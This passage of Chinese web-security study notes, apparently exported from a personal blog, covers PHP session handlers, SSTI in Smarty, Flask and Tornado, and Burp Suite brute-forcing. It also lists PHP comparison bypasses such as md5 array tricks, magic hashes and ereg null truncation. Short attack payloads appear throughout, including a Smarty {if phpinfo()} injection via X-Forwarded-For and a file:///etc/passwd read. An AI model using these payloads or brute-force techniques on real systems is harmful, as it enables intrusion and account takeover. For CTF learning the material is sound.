<h5 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h5><p>首先来看看默认<code>session.serialize_handler = php</code>时候的序列化结果，代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20220311/1646988663_622b0d779748192aba6f7.png!small" alt="img"></p>
<p>为了方便查看，将<code>session</code>存储目录设置为<code>session.save_path = &quot;/www/php_session&quot;</code>，<code>PHPSESSID</code>文件如下</p>
<p>1、文件名</p>
<p>文件名为<code>sess_mpnnbont606f50eb178na451od</code>，其中<code>mpnnbont606f50eb178na451od</code>就是后续请求头中<code>Cookie</code>携带的<code>PHPSESSID</code>的值 (如上图浏览器中已存储)</p>
<p>2、文件内容</p>
<p>php处理器存储格式</p>
<table>
<thead>
<tr>
<th align="center">键名</th>
<th align="center">竖线</th>
<th align="center">经过 serialize() 函数反序列处理的值</th>
</tr>
</thead>
<tbody><tr>
<td align="center">$_SESSION[‘name’]的键名：name</td>
<td align="center">|</td>
<td align="center">s:6:”harden”;</td>
</tr>
</tbody></table>
<h5 id="php-binary处理器"><a href="#php-binary处理器" class="headerlink" title="php_binary处理器"></a>php_binary处理器</h5><p>使用php_binary处理器，即<code>session.serialize_handler = php_binary</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="comment"># 为了方便ACSII显示，将键名设置为36个字符长度</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;namenamenamenamenamenamenamenamename&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;namenamenamenamenamenamenamenamename&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>由于三种方式<code>PHPSESSID</code>文件名都是一样的，这里只需要查看文件内容</p>
<p><img src="https://image.3001.net/images/20220311/1646988665_622b0d79304714550f427.png!small" alt="img"></p>
<table>
<thead>
<tr>
<th align="center">键名的长度对应的 ASCII 字符</th>
<th align="center">键名</th>
<th align="center">经过 serialize() 函数反序列处理的值.</th>
</tr>
</thead>
<tbody><tr>
<td align="center">$</td>
<td align="center">namenamenamenamenamenamenamenamename</td>
<td align="center">s:6:”harden”;</td>
</tr>
</tbody></table>
<h5 id="php-serialize-处理器"><a href="#php-serialize-处理器" class="headerlink" title="php_serialize 处理器"></a>php_serialize 处理器</h5><p>使用php_binary处理器，即<code>session.serialize_handler = php_serialize</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>文件内容即经过 serialize() 函数反序列处理的数组，<code>a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;harden&quot;;&#125;</code></p>
<p><img src="https://image.3001.net/images/20220311/1646988666_622b0d7a2a04733d2da9c.png!small" alt="img"></p>
<hr>
<h2 id="十二、rce"><a href="#十二、rce" class="headerlink" title="十二、rce"></a>十二、rce</h2><blockquote>
<p>“<code>|</code>”:管道符，前面命令标准输出，后面命令的标准输入。例如：help |more</p>
<p>“<code>&amp;</code>” commandA <code>&amp;</code> commandB 先运行命令<code>A</code>，然后运行命令<code>B</code> </p>
<p>“<code>||</code>” commandA <code>||</code> commandB 运行命令<code>A</code>，如果失败则运行命令<code>B</code> </p>
<p>“<code>&amp;&amp;</code>” commandA <code>&amp;&amp;</code> commandB 运行命令<code>A</code>，如果成功则运行命令<code>B</code></p>
</blockquote>
<hr>
<h2 id="十三、ssti"><a href="#十三、ssti" class="headerlink" title="十三、ssti"></a>十三、ssti</h2><blockquote>
<p><a href="https://www.cnblogs.com/20175211lyz/p/11425368.html">参考文章</a></p>
</blockquote>
<p>根据下图，推测不同的模板注入，然后使用不同的注入方法</p>
<p><img src="/2022/05/28/Web-study/image-20220903123146044.png" alt="image-20220903123146044"></p>
<p><img src="/2022/05/28/Web-study/image-20220903123047693.png" alt="image-20220903123047693"></p>
<blockquote>
<p><a href="https://blog.csdn.net/weixin_51353029/article/details/111503731">原文链接1</a></p>
<p><a href="https://www.freebuf.com/articles/network/219913.html">原文链接2</a></p>
<p><u><strong>注，由于 转义内容 Hexo使用Nunjucks渲染帖子（较早的版本使用Swig，它们具有相似的语法）。用<code>&#123; &#123; &#125; &#125;</code>或<code>&#123; ％ ％ &#125;</code>包装的内容将被解析，并可能导致问题。您可以使用原始标签插件包装敏感内容。</strong></u></p>
<p>这里是把所有{  {}  }和 {  %% }，没有空格，替换成有空格的，才能上传博客</p>
</blockquote>
<h3 id="关于基于flask的SSTI漏洞的阶段学习小结："><a href="#关于基于flask的SSTI漏洞的阶段学习小结：" class="headerlink" title="关于基于flask的SSTI漏洞的阶段学习小结："></a>关于基于flask的SSTI漏洞的阶段学习小结：</h3><h4 id="SSTI的理解："><a href="#SSTI的理解：" class="headerlink" title="SSTI的理解："></a>SSTI的理解：</h4><p>SSTI和SQL注入原理差不多，都是因为对输入的字符串控制不足，把输入的字符串当成命令执行。</p>
<h4 id="SSTI引发的真正原因："><a href="#SSTI引发的真正原因：" class="headerlink" title="SSTI引发的真正原因："></a>SSTI引发的真正原因：</h4><p>render_template渲染函数的问题</p>
<h4 id="render-template渲染函数是什么："><a href="#render-template渲染函数是什么：" class="headerlink" title="render_template渲染函数是什么："></a>render_template渲染函数是什么：</h4><p>就是把HTML涉及的页面与用户数据分离开，这样方便展示和管理。当用户输入自己的数据信息，HTML页面可以根据用户自身的信息来展示页面，因此才有了这个函数的使用。</p>
<h4 id="render-template："><a href="#render-template：" class="headerlink" title="render_template："></a>render_template：</h4><p>渲染函数在渲染的时候，往往对用户输入的变量不做渲染，<br>即：{  {}  }在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把{  {}  }包裹的内容当做变量解析替换。比如{  {1+1}  }会被解析成2。因此才有了现在的模板注入漏洞。往往变量我们使用{  {这里是内容}  }<br>真因为{  {}  }包裹的东西会被解析，因此我们就可以实现类似于SQL注入的漏洞</p>
<p><code>注入的思想：</code></p>
<blockquote>
<p>用函数不断调用我们要使用的命令如：file、read、open、ls等等命令，我们用这些来读取写入配置文件；</p>
</blockquote>
<h3 id="Smarty-SSTI利用"><a href="#Smarty-SSTI利用" class="headerlink" title="Smarty SSTI利用"></a>Smarty SSTI利用</h3><p>Smarty是基于PHP开发的，对于Smarty的SSTI的利用手段与常见的flask的SSTI有很大区别。</p>
<h4 id="漏洞确认"><a href="#漏洞确认" class="headerlink" title="漏洞确认"></a>漏洞确认</h4><p>一般情况下输入{$smarty.version}就可以看到返回的smarty的版本号。该题目的Smarty版本是3.1.30</p>
<h4 id="常规利用方式"><a href="#常规利用方式" class="headerlink" title="常规利用方式"></a>常规利用方式</h4><h5 id="php-x2F-php-标签"><a href="#php-x2F-php-标签" class="headerlink" title="{php}{&#x2F;php}标签"></a>{php}{&#x2F;php}标签</h5><p>Smarty支持使用{php}{&#x2F;php}标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但就该题目而言，使用{php}{&#x2F;php}标签会报错：</p>
<p><img src="https://pic3.zhimg.com/80/v2-a24770cd727d793d93abd89d5025ad41_hd.jpg" alt="v2-a24770cd727d793d93abd89d5025ad41_hd.j"></p>
<p>在Smarty3的官方手册里有以下描述:</p>
<blockquote>
<p>Smarty已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。</p>
</blockquote>
<p>该题目使用的是Smarty类，所以只能另寻它路。</p>
<h5 id="literal-标签"><a href="#literal-标签" class="headerlink" title="{literal} 标签"></a>{literal} 标签</h5><p>官方手册这样描述这个标签：</p>
<blockquote>
<p>{literal}可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。</p>
</blockquote>
<p>那么对于php5的环境我们就可以使用</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span>phpinfo();<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>来实现PHP代码的执行，但这道题的题目环境是PHP7，这种方法就失效了。</p>
<h4 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h4><p>通过self获取Smarty类再调用其静态方法实现文件读写被网上很多文章采用。</p>
<p>Smarty类的getStreamVariable方法的代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getStreamVariable</span>(<span class="params"><span class="variable">$variable</span></span>)</span>&#123;        <span class="variable">$_result</span> = <span class="string">&#x27;&#x27;</span>;        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$variable</span>, <span class="string">&#x27;r+&#x27;</span>);        <span class="keyword">if</span> (<span class="variable">$fp</span>) &#123;            <span class="keyword">while</span>  (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>) &amp;&amp; (<span class="variable">$current_line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;                <span class="variable">$_result</span> .= <span class="variable">$current_line</span>;            &#125;            <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);            <span class="keyword">return</span> <span class="variable">$_result</span>;        &#125;        <span class="variable">$smarty</span> =  <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;smarty) ? <span class="variable language_">$this</span>-&gt;smarty : <span class="variable language_">$this</span>;        <span class="keyword">if</span>  (<span class="variable">$smarty</span>-&gt;error_unassigned) &#123;            <span class="keyword">throw</span> <span class="keyword">new</span>  <span class="title class_">SmartyException</span>(<span class="string">&#x27;Undefined stream variable &quot;&#x27;</span> . <span class="variable">$variable</span> . <span class="string">&#x27;&quot;&#x27;</span>);        &#125; <span class="keyword">else</span> &#123;            <span class="keyword">return</span> <span class="literal">null</span>;        &#125;    &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法，很多文章里给的payload都形如：{self::getStreamVariable(“file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd”)}。然而使用这个payload会触发报错如下：</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">Fatal error: Uncaught --&gt; Smarty Compiler: Syntax error in template  <span class="string">&quot;string:&lt;meta http-equiv=&quot;</span>...<span class="string">&quot;&gt;Current  IP:&#123;self::getStreamVariable(‘file:///etc/passwd’)&#125;&quot;</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="string">&#x27;self&#x27;</span>  is undefined or not allowed by security setting &lt;-- thrown in  <span class="regexp">/var/</span>www<span class="regexp">/html/</span>smarty<span class="regexp">/libs/</span>sysplugins/smarty_internal_templatecompilerbase.php on line <span class="number">12</span></span><br></pre></td></tr></table></figure>

<p>可见这个旧版本Smarty的SSTI利用方式并不适用于新版本的Smarty。而且在3.1.30的Smarty版本中官方已经把该静态方法删除。对于那些文章提到的利用 Smarty_Internal_Write_File 类的writeFile方法来写shell也由于同样的原因无法使用。</p>
<h5 id="if-标签"><a href="#if-标签" class="headerlink" title="{if}标签"></a>{if}标签</h5><p>官方文档中看到这样的描述：</p>
<blockquote>
<p>Smarty的{if}条件判断和PHP的if 非常相似，只是增加了一些特性。每个{if}必须有一个配对的{&#x2F;if}. 也可以使用{else} 和 {elseif}. </p>
<p>全部的PHP条件表达式和函数都可以在if内使用，<br>如*||*, or, &amp;&amp;, and, is_array(), 等等</p>
</blockquote>
<p>既然全部的PHP函数都可以使用，那么我们是否可以利用此来执行我们的代码呢？</p>
<p>将XFF头改为{if phpinfo()}{&#x2F;if}，可以看到题目执行了phpinfo()</p>
<p><img src="https://pic4.zhimg.com/80/v2-bddead1f721c42eed678d9db9527c0e7_hd.jpg" alt="v2-bddead1f721c42eed678d9db9527c0e7_hd.j"></p>
<p>用同样的方法可以轻松获得flag</p>
<p>题目漏洞代码</p>
<p>通过getshell之后的文件读取，本题中引发SSTI的代码简化后如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">require_once</span>(<span class="string">&#x27;./smarty/libs/&#x27;</span> . <span class="string">&#x27;Smarty.class.php&#x27;</span>);<span class="variable">$smarty</span> = <span class="keyword">new</span> <span class="title class_">Smarty</span>();<span class="variable">$ip</span> =  <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&quot;string:&quot;</span>.<span class="variable">$ip</span>);&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里使用字符串代替smarty模板，导致了注入的Smarty标签被直接解析执行，产生了SSTI。</p>
<h3 id="Tornado-SSTI利用"><a href="#Tornado-SSTI利用" class="headerlink" title="Tornado SSTI利用"></a>Tornado SSTI利用</h3><p><strong>tornado是用Python编写的Web服务器兼Web应用框架</strong>，简单来说就是用来生成模板的东西。和Python相关，和模板相关</p>
<blockquote>
<p> Tornado模板支持控制语句和表达式。</p>
<p> 控制语句被{ % % }, e.g. { % if len(items) &gt; 2 %}</p>
<p> 表达式被{ { } }, e.g. { { items[0] } }.</p>
</blockquote>
<p><strong>render()<strong>是tornado里的函数，</strong>可以生成html模板。是一个渲染函数</strong>，就是一个公式，<strong>能输出前端页面的公式。</strong></p>
<p><strong>Tornado</strong>框架的附属文件<strong>handler.settings</strong>中存在<strong>cookie_secret</strong></p>
<p><strong>Handler</strong>这个对象，<u>Handler指向的处理当前这个页面的RequestHandler对象</u></p>
<blockquote>
<p><code>RequestHandler</code>中并没有settings这个属性，与RequestHandler关联的Application对象（Requestion.application）才有setting这个属性</p>
<p>handler 指向RequestHandler</p>
<p>而RequestHandler.settings又指向self.application.settings</p>
<p>所有handler.settings就指向RequestHandler.application.settings了！</p>
</blockquote>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>web基础+进阶学习</tag>
      </tags>
  </entry>
  <entry>
    <title>WEB学习笔记</title>
    <url>/2022/05/31/daily/</url>
    <content><![CDATA[<p><code>随便记一下，记录学习过程中的学习经验，欢迎指正和补充</code></p>
<span id="more"></span>

<h1 id="学习随记"><a href="#学习随记" class="headerlink" title="学习随记"></a>学习随记</h1><h1 id="1-网站连接重置，用清空缓存和Cookie解决"><a href="#1-网站连接重置，用清空缓存和Cookie解决" class="headerlink" title="1.网站连接重置，用清空缓存和Cookie解决"></a>1.网站连接重置，用清空缓存和<u><strong>Cookie</strong></u>解决</h1><p>今天在打buuctf靶场的时候遇到一个问题，就是当页面跳转时，会显示连接重置，导致我的sql注入结果不能显示，然后百度了一下，发现可能是浏览器缓存太多导致的，于是我把浏览器的缓存和cookie一同全部清空，然后我再刷新sql 注入那道题的界面，解决了，没有再显示连接重置，也显示了我的注入结果，我正要交flag的时候，然后，我发现…..，我的buuctf账号下线，我的csdn账号也下线了</p>
<p>cookie的作用和重要性就出来了，从这个事情看出，cookie是当我们登录网站的主要身份凭证，当我删除cookie后，我无法证明自己身份时，即网站当前浏览器无该账号当前在该网站的cookie时，网站就会强制下线我的账号</p>
<p>但是，如果我们在登录网站时（没有退出），点击了其他链接导致自己在该浏览器的该网站的cookie外泄，被有心人获取，那么拥有你的cookie的人，就可以登录你的账号，在你登录的网站上进行修改密码，删除文章，甚至可以转账等等</p>
<p>所以以后登录了一些重要网站时，比如支付宝，淘宝，博客网站时，别随便点击链接，保证自己的信息安全，不要黑客被黑客黑了，那确实有点难为情了</p>
<blockquote>
<p><code>Cookie实际上是一小段的文本信息。客户端请求服务器，如果服务器需要记录该用户状态，就使用response向客户端浏览器颁发一个Cookie。客户端浏览器会把Cookie保存起来。当浏览器再请求该网站时，浏览器把请求的网址连同该Cookie一同提交给服务器。服务器检查该Cookie，以此来辨认用户状态。服务器还可以根据需要修改Cookie的内容</code></p>
</blockquote>
<h1 id="2-Burpsuite密码爆破初次使用"><a href="#2-Burpsuite密码爆破初次使用" class="headerlink" title="2.Burpsuite密码爆破初次使用"></a>2.Burpsuite密码爆破初次使用</h1><p>虽然不知道这个网站是那位大佬总结建立的，但还是很感谢，节省很多时间，这个网站提供了很全面的密码表</p>
<blockquote>
<p><a href="https://www.somd5.com/download/dict/">https://www.somd5.com/download/dict/</a></p>
</blockquote>
<p>之前在学习burpsuite的时候，大部分时间在用proxy和request，一直想用intruder，在做功防世界weak_auth这道题时，需要用字典爆破</p>
<p>于是我便了解了一下这个功能</p>
<blockquote>
<p>在intruder下，主要看payload</p>
<p>payload Sets主要用Simple list和Brute forcer</p>
</blockquote>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><h3 id="1-Simple-list"><a href="#1-Simple-list" class="headerlink" title="1.Simple list"></a>1.Simple list</h3><p>主要就是讲写好的密码列表挨个进行测试，试出可以正确登录的密码</p>
<p><img src="/2022/05/31/daily/image-20220624165348786.png" alt="image-20220624165348786"></p>
<h3 id="2-Brute-forcer"><a href="#2-Brute-forcer" class="headerlink" title="2.Brute forcer"></a>2.Brute forcer</h3><p>就比较暴力，可以从下图看到Requset count有8,398,080次，因为他是把下面Character set里的所以字符的排列组合都试了，简单粗暴，也非常耗时间</p>
<p><img src="/2022/05/31/daily/image-20220624165405777.png" alt="image-20220624165405777"></p>
<p>这里以一次爆破为例，可以看到下方有两个<code>§ §</code>，这两处就是payload输入点，我们输入爆破数据就不断在这两处上传测试</p>
<p><img src="/2022/05/31/daily/image-20220624170325792.png" alt="image-20220624170325792"></p>
<p>如果我们已经知道了一处的数据，比如下方的username为admin，就不用用测试数据爆破，只用在password处爆破</p>
<p><img src="/2022/05/31/daily/image-20220624170753675.png" alt="image-20220624170753675"></p>
<p>那么爆破完后，如何分辨哪个才是正确密码呢</p>
<p>主要分析length，如果出现与大部分length不同的密码，那么大概率就是正确密码，比如此处， 123456就是正确密码</p>
<p><img src="/2022/05/31/daily/image-20220624170455916.png" alt="image-20220624170455916"></p>
<h3 id="3-Numbers"><a href="#3-Numbers" class="headerlink" title="3.Numbers"></a>3.Numbers</h3><p><img src="/2022/05/31/daily/image-20220626083426611.png" alt="image-20220626083426611"></p>
<p>纯数字型爆破，From是开始数字，To是结束数字，Step是间隔多少数字爆破一次</p>
<h3 id="4-Runtime-file"><a href="#4-Runtime-file" class="headerlink" title="4.Runtime file"></a>4.Runtime file</h3><p>选择自己的字典文件</p>
<h3 id="5-Custom-iterator"><a href="#5-Custom-iterator" class="headerlink" title="5.Custom iterator"></a>5.Custom iterator</h3><p>（可以自定义拼接字段，比如username:password，这样爆破的两列数据被:隔开进行爆破）</p>
<p>自定义迭代器。这种负载类型，可以配置项目的多个列表，并使用生成的列表中项的所有排列有效载荷。它提供了一个强有力的方法根据给定的模板，以产生字符或其他项目的定制排列。</p>
<h3 id="6-Character-substitution"><a href="#6-Character-substitution" class="headerlink" title="6.Character substitution"></a>6.Character substitution</h3><p>字符替换。此负载类型允许您配置一个字符串列表，并应用各种字符替换到每个项目。这可能是在密码猜测攻击非常有用，用来产生在字典中的单词常见的变化。</p>
<h3 id="7-Case-modification"><a href="#7-Case-modification" class="headerlink" title="7.Case modification"></a>7.Case modification</h3><p>此负载类型允许配置一个字符串列表，并应用各种情况下修改每个项目。这可能对密码猜测攻击非常有用，用来产生在字典中的单词的情况下的变化。</p>
<h3 id="8-Recursivegrep"><a href="#8-Recursivegrep" class="headerlink" title="8.Recursivegrep"></a>8.Recursivegrep</h3><p>递归grep，要用这个必须在Intruder&gt;options&gt;Grep-extract下添加一个响应匹配，比如说我一个请求页需要前一个响应页中的内容，这里就可以这样使用了。</p>
<h3 id="9-Dates"><a href="#9-Dates" class="headerlink" title="9.Dates"></a>9.Dates</h3><p>时间、日期</p>
<h3 id="10-Null-payloads"><a href="#10-Null-payloads" class="headerlink" title="10.Null payloads"></a>10.Null payloads</h3><p>这种攻击载荷产生有效载荷，其值是一个空字符串。当某种攻击请求需要反复发送同样的请求，但这种请求相对于基本请求是没有任何修改，这种攻击载荷产生有效载荷，这可用于各种攻击，例如采集 cookies来进行测序分析；应用层的拒绝服务攻击，这些请求被重复发送，导致服务器上产生高工作负荷的任务，或保活会话令牌，以便这些令牌在其它的间歇试验中使用。使用此载荷类型，它甚至没有必要在请求模板中标志有效载荷位置。您可以配置Burp产生一定特定数目的空有效载荷，或无限期地持续下去。当然我们也可以使用数字、日期等其他方式产生大量的连接，导致服务器的负载过高。</p>
<h2 id="Attack-type（爆破方式）"><a href="#Attack-type（爆破方式）" class="headerlink" title="Attack type（爆破方式）"></a>Attack type（爆破方式）</h2><p><img src="/2022/05/31/daily/image-20220710224734912.png" alt="image-20220710224734912"></p>
<h3 id="1-Sniper"><a href="#1-Sniper" class="headerlink" title="1.Sniper"></a>1.Sniper</h3><p> 这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。</p>
<h3 id="2-Battering-ram"><a href="#2-Battering-ram" class="headerlink" title="2.Battering ram"></a>2.Battering ram</h3><p> 这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中。</p>
<h3 id="3-Pitchfork"><a href="#3-Pitchfork" class="headerlink" title="3.Pitchfork"></a>3.Pitchfork</h3><p>这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量。</p>
<h3 id="4-Cluster-bomb"><a href="#4-Cluster-bomb" class="headerlink" title="4.Cluster bomb"></a>4.Cluster bomb</h3><p>这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。（即可以在用户名和密码两处用两个字典爆破）</p>
<h1 id="3-git命令"><a href="#3-git命令" class="headerlink" title="3.git命令"></a>3.git命令</h1><p>使用githack，记录一些命令</p>
<p><img src="/2022/05/31/daily/image-20220729114811362.png" alt="image-20220729114811362"></p>
<h1 id="4-函数记录"><a href="#4-函数记录" class="headerlink" title="4.函数记录"></a>4.函数记录</h1><h2 id="1-php函数md5"><a href="#1-php函数md5" class="headerlink" title="1)php函数md5"></a>1)php函数md5</h2><blockquote>
<p>ps.<br>sha1，由于此函数依赖的算法已不足够复杂,不推荐使用此函数对明文密码加密。目前大多用md5</p>
<p>但是和md5一样，sha1函数无法处理数组，遇到数组会返回NULL</p>
</blockquote>
<p>做题时，了解到了一个新的函数<code>md5</code></p>
<blockquote>
<p>php md5函数介绍为：</p>
<p>md5( string , raw )</p>
<p>string : 规定需要计算的字符串</p>
<p>raw : 规定十六进制或二进制输出格式。</p>
<p>​        true：16字符二进制格式</p>
<p>​        false(默认): 32字符十六进制数</p>
</blockquote>
<p>比较常用的</p>
<p>数字型：<code>129581926211651571912466741651878684928</code></p>
<p><img src="/2022/05/31/daily/image-20220811135742130.png" alt="image-20220811135742130"></p>
<p>字符型：<code>ffifdyop</code></p>
<p><img src="/2022/05/31/daily/image-20220811135813137.png" alt="image-20220811135813137"></p>
<p>发现都有’<code>or</code>‘的形式，可以构造必真的结果</p>
<blockquote>
<p>MD5函数有一个漏洞，当输入的为数组时，会返回为NULL</p>
<p>所以当遇到md5(p1)&#x3D;&#x3D;&#x3D;md5(p2)，把p1和p2进行强比较时，又要求p1和p2不相等</p>
<p>由于两个不同的字符MD5值很难一致，于是输入p1[]和p2[]两个名字一致的字符，随便赋值，<br>p1[]&#x3D;1&amp;p2[]&#x3D;2<br>返回为空，使得强比较成立</p>
<hr>
<p>为什么会这样呢<br>我想起之前的遇到一个题，也有数组，问了一下大佬</p>
<p>大佬说，因为没有对数组中的元素数量声明，函数不知道数组元素第几个的值是1（或2）<br>导致函数到处扫，最后返回NULL【因为这个元素位置我们根本就没定】</p>
<p>下面举几个例子，以我个人理解<br>如果是<br>p1[0]&#x3D;1&amp;p2[0]&#x3D;2<br>是可以的，因为只定义了0号位的数据，而且不相等，其他位置数据没定义，所以比较也不可能出现相等</p>
<p>p1[0]&#x3D;1&amp;p2[1]&#x3D;1<br>是可以的，因为这里p1[]定义了0号位为1，而p2定义的是1号位为1，比较是按顺序比较的，两个数值虽然一样，但是位置不一样，所以比较还是不相等</p>
</blockquote>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">下列的字符串的MD5值都是<span class="number">0</span>e开头的：</span><br><span class="line"></span><br><span class="line"> QNKCDZO</span><br><span class="line"> <span class="number">240610708</span></span><br><span class="line"> s878926199a</span><br><span class="line"> s155964671a</span><br><span class="line"> s214587387a</span><br><span class="line"> s1091221200a</span><br></pre></td></tr></table></figure>

<h2 id="2-php函数ereg，null截断"><a href="#2-php函数ereg，null截断" class="headerlink" title="2)php函数ereg，null截断"></a>2)php函数ereg，null截断</h2><p><strong>此函数在 PHP 5.3.0中已弃用，并在PHP 7.0.0中删除。</strong></p>
<p><strong>[所以遇到无法执行时，可能是出题人没有注意部署题目环境]</strong></p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">ereg()函数用指定的模式搜索一个字符串中指定的字符串<span class="punctuation">,</span>如果匹配成功返回<span class="keyword">true</span><span class="punctuation">,</span>否则<span class="punctuation">,</span>则返回<span class="keyword">false</span>。搜索字母的字符是大小写敏感的。 </span><br><span class="line"></span><br><span class="line">ereg函数存在NULL截断漏洞，导致了正则过滤被绕过<span class="punctuation">,</span>所以可以使用<span class="variable">%00</span>截断正则匹配</span><br><span class="line"></span><br><span class="line">比如</span><br><span class="line">ereg (<span class="string">&quot;^[a-zA-Z]+$&quot;</span><span class="punctuation">,</span> $_GET[&#x27;<span class="keyword">c</span>&#x27;])</span><br><span class="line"></span><br><span class="line">当<span class="keyword">c</span><span class="operator">=</span>a<span class="variable">%00123</span>时</span><br><span class="line">ereg只会检测到第一个a为止，后面的数据都被<span class="variable">%00</span>截断了，从而绕过匹配</span><br></pre></td></tr></table></figure>

<p>所以现在一般不再使用<code>ereg</code>，只是做为<code>preg_match</code>替代函数使用</p>
<h2 id="3-php函数sleep"><a href="#3-php函数sleep" class="headerlink" title="3)php函数sleep"></a>3)php函数sleep</h2><blockquote>
<p>当遇到这种需要我们输入参数，但是让参数值必须很大，</p>
<p>而且最后又以这个参数执行sleep函数，就会让我们等很久</p>
</blockquote>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">sleep</span><span class="params">((int)</span></span><span class="variable">$time</span>)</span><br></pre></td></tr></table></figure>

<p><code>sleep()</code>要延缓其程序执行的时间。</p>
<p>但是我们又不能等太久，可以构造php中的科学计数法绕过，就构造一个  </p>
<blockquote>
<p><code>time=0.3e7 （等价于0.3乘10的7次方）</code> </p>
</blockquote>
<p>这样它的值达到了判断的标准。</p>
<p>而且当它<strong>强制转化为整数型</strong>(<code>int</code>)的时候就会因为开头为<code>0.3</code>是<strong>小数变成零</strong>，这样可以满足条件。</p>
<h2 id="4-php函数is-numeric"><a href="#4-php函数is-numeric" class="headerlink" title="4)php函数is_numeric()"></a>4)php函数is_numeric()</h2><p>当遇到类似</p>
<blockquote>
<p><code>0e..;1e;..2e..;...</code></p>
</blockquote>
<p>函数会把其当作科学计数法</p>
<p>这样当遇到</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$num</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">if</span>(<span class="variable">$num</span>)&#123;</span><br><span class="line">            <span class="built_in">if</span>(!<span class="built_in">is_numeric</span>(<span class="variable">$time</span>))</span><br></pre></td></tr></table></figure>

<p>这种</p>
<blockquote>
